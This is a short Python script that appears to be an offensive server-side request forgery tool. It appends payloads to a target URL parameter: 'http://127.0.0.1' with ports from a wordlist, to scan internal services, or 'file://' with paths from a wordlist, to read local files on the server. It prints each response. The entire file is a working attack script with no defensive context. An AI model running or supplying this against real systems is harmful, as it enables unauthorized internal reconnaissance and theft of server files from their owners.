#-*- coding:utf-8 -*-
import sys
import requests

def ssrf_http(url,dir):
    with open(dir,'r')as port:
        for i in port:
            path ='=http://127.0.0.1:%s'%i.strip()
            r = requests.get(url=url+path)
            print('-------------------')
            print('port'+':'+i)

            print(r.text)
def ssrf_file(url,dir):
    url =url+'=file://'

    with open(dir,'r') as f:
        f = f.readlines()
        for i in f:
            print('-------------------')
            print(i)
            print('-------------------')
            r = requests.get(url+i.strip())
            print(r.text)
            print('-------------------')
if __name__ == '__main__':
    url = sys.argv[1]
    dir = sys.argv[2]
    mode = sys.argv[3]
    if mode == 'file':
        ssrf_file(url,dir)

    else:
        ssrf_http(url,dir)
    #ssrf_file(url,dir)
    #ssrf_http(url,dir)
